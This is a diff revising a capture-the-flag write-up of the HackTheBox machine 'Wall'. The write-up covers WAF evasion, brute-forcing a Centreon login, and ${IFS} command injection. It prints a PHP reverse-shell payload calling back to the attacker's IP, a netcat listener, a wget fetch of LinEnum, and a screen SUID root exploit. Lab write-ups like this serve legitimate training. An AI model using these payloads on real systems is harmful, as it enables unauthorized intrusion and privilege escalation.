@@ -1,7 +1,7 @@
 # HackTheBox: Wall.
 My write up for the recently retired HackTheBox machine: Wall!
 
-Wall was a fairly easy machine, although it was a little frustrating.
+Wall was a fairly easy machine, although a little frustrating.
 
 The machine had a web application vulnerable to RCE, however it was (semi) protected by a WAF.
 
@@ -40,7 +40,7 @@ Discovering these pages:
 
 After attempting to login with common credentials and bruteforcing to no avail. I looked to the forums - finding this interesting post by @argot:
 
-  English teachers can be very good at monitoring their class. Often times, if you use the wrong verb, they wont let you go. If you use different VERBS, maybe they'll let you go or at the very least they'll be more talkative.
+> English teachers can be very good at monitoring their class. Often times, if you use the wrong verb, they wont let you go. If you use different VERBS, maybe they'll let you go or at the very least they'll be more talkative.
 
 ## Verbs?
 Instead of GET, a POST request to /monitoring results in:
@@ -52,7 +52,7 @@ root@kali:~# curl -X POST "http://10.10.10.157/monitoring/" -d "username=u&passw
 ```
 A redirection to /centreon!
 
-  [Centreon](https://github.com/centreon/centreon) is one of the most flexible and powerful monitoring softwares on the market; it is absolutely free and Open Souce.
+  [Centreon](https://github.com/centreon/centreon) is one of the most flexible and powerful monitoring software on the market; it is absolutely free and Open Souce.
 
 Looking around on centreon [documentation](https://documentation.centreon.com/docs/centreon/en/19.04/api/api_rest/index.html#authentication), I found the login api was at:
 
@@ -60,7 +60,7 @@ Looking around on centreon [documentation](https://documentation.centreon.com/do
 
 ### Bruteforcing script!
 The documentation says the default username is admin.
-So I wrote a super simple script to bruteforce login API using rockyou:
+So I wrote a quick script to bruteforce login API using rockyou:
 
 ```
 #!/bin/bash
@@ -71,7 +71,7 @@ do
 done
 
 ```
-The password is found to be password1.
+The script completes, finding the password to be password1.
 
 ### Attempting to pop a shell
 
@@ -90,28 +90,30 @@ So to inject the command, these two could not be present.
 ## ${IFS}
 After some time studying at mhaskar's script, I decided to exploit using the GUI route.
 
-Instead of space, I used ${IFS} to escape the space char as well as a PHP exploit to bypass 'nc'.
+Instead of space, I used ${IFS} to escape the char as well as a PHP exploit to bypass 'nc'.
 
 * [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-* [StackExchange]https://security.stackexchange.com/questions/198928/reverse-php-shell-disconnecting-when-netcat-listener
+* [StackExchange](https://security.stackexchange.com/questions/198928/reverse-php-shell-disconnecting-when-netcat-listener)
 
-I used those to craft a payload that results in status 200, then put the payload into Commands > Misc and bound it to the poller.
+Using the above links, I crafted a payload that results in status 200, then put the payload into Commands > Misc and bound it to the poller.
 
 Payload:
 ```
 php${IFS}-r${IFS}'$s=fsockopen("10.10.14.***",1337);$proc=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$pipes);'
-
 ```
-I then navigated to the page that the mhaskar script is sending requests to, checked the box that says 'post command' and hit export while listening on netcat.
+I then navigated to the page that mhaskar's script is sending requests to, checked the box that says 'post command' and hit export while listening on netcat.
 
 Netcat listener:
 ```
 $ nc -lvp 1337
 ```
 I got a shell!
+```
+$ id
+$ uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)
+```
 
 ## www-data
-
 Now I have a restricted shell - I need to perfrom some privilege escalation.
 
 I used LinEnum by running the following on my machine in the directory that LinEnum was in.
@@ -123,15 +125,14 @@ $ python -m SimpleHTTPServer 8000
 And running the following on the target machine:
 
 ```
-& wget 10.10.14.***:8000/LinEnum.sh
+$ wget 10.10.14.***:8000/LinEnum.sh
 $ chmod +x LinEnum.sh
 $ ./LinEnum.sh
 ```
 
 ## SUID PrivEsc
 
-LinEnum shows me a vulnerable SUID:
-
+Looking through the LinEnum report, I spot a vulnerable SUID:
 ```
 -rwsr-xr-x 1 root root 1595624 Jul  4 00:25 /bin/screen-4.5.0
 ```
@@ -150,6 +151,29 @@ $ ./screenroot.sh
 
 After running the script, I get root access!
 
+```
+$ whoami
+$ root
+```
+
+I grab the root flag:
+```
+$ cat /root/root.txt
+$ 1fdbcf8c33eaa2599afdc52e1b4d5db7
+```
+And the user flag:
+```
+$ cat /home/shelby/user.txt
+$ fe6194544f452f62dc905b12f8da8406
+```
+
+## Cleaning up after myself
+```
+$ cd /var/tmp
+$ rm screenroot.sh
+$ rm LinEnum.sh
+```
+
 ## Thanks for reading :)
 
-I've prepared writeups for Postman, Traverxec and Obscurity. Check back when they're retired for the writeups.
+I've prepared writeups for Postman, Traverxec and Resolute. Check back when they're retired!
